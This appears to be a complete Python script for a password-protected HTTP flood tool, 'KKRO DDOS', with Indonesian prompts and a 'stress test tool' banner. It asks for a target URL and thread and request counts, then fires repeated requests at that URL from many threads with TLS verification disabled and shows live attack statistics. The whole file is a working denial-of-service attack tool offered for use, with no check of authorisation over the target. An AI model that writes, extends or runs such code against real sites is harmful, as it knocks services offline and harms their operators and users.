import threading
import urllib.request
import time
import ssl
import os
import sys

# ==================== PASSWORD ====================
PASSWORD = "kkro123"

def check_password():
    print("\033[1;36m" + "╔══════════════════════════════════════════════════════════════════╗")
    print("║                   🔐 KKRO DDOS - PROTECTED ACCESS 🔐                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝\033[0m\n")
    
    for attempt in range(3):
        try:
            pw = input("\033[1;33m[?] PASSWORD: \033[0m")
            if pw == PASSWORD:
                print("\033[1;32m[✓] AKSES DIIJINKAN!\033[0m\n")
                time.sleep(1)
                return True
            else:
                print(f"\033[1;31m[✗] Password salah ({attempt+1}/3)\033[0m")
        except:
            print("\033[1;31m[✗] Input error\033[0m")
    
    print("\033[1;31m[!] AKSES DITOLAK! Terlalu banyak percobaan.\033[0m")
    return False

def clear_screen():
    os.system('clear')

def show_header():
    clear_screen()
    print("\033[1;31m")
    print(" ██╗  ██╗██╗  ██╗██████╗  ██████╗      ██████╗ ██████╗  ██████╗ ███████╗")
    print(" ██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗    ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝")
    print(" █████╔╝ █████╔╝ ██████╔╝██║   ██║    ██║   ██║██║  ██║██║   ██║███████╗")
    print(" ██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║    ██║   ██║██║  ██║██║   ██║╚════██║")
    print(" ██║  ██╗██║  ██╗██║  ██║╚██████╔╝    ╚██████╔╝██████╔╝╚██████╔╝███████║")
    print(" ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝")
    print("\033[0m")
    print("\033[1;36m" + "="*60)
    print("       KKRO DDOS - STRESS TEST TOOL")
    print("="*60 + "\033[0m\n")

def main():
    if not check_password():
        sys.exit(1)
    
    show_header()
    
    url = input("\033[1;33m[+] Target URL: \033[0m").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        threads = int(input("\033[1;33m[+] Threads: \033[0m"))
        requests = int(input("\033[1;33m[+] Requests: \033[0m"))
    except:
        print("\033[1;31m[!] Invalid input\033[0m")
        return
    
    ctx = ssl._create_unverified_context()
    sent = 0
    failed = 0
    start = time.time()
    
    def attack():
        nonlocal sent, failed
        for _ in range(requests):
            try:
                urllib.request.urlopen(url, timeout=5, context=ctx)
                sent += 1
            except:
                failed += 1
    
    attack_threads = []
    for i in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        attack_threads.append(t)
    
    while any(t.is_alive() for t in attack_threads):
        elapsed = time.time() - start
        if elapsed > 0:
            speed = sent / elapsed
        else:
            speed = 0
        
        print(f"\r\033[1;36mSent: {sent:,} | \033[1;31mFailed: {failed:,} | \033[1;33mTime: {elapsed:.1f}s | \033[1;35mSpeed: {speed:.0f}/s\033[0m", end='')
        time.sleep(0.2)
    
    print(f"\n\n\033[1;32m[+] Done! Sent: {sent:,} requests")

if __name__ == "__main__":
    main()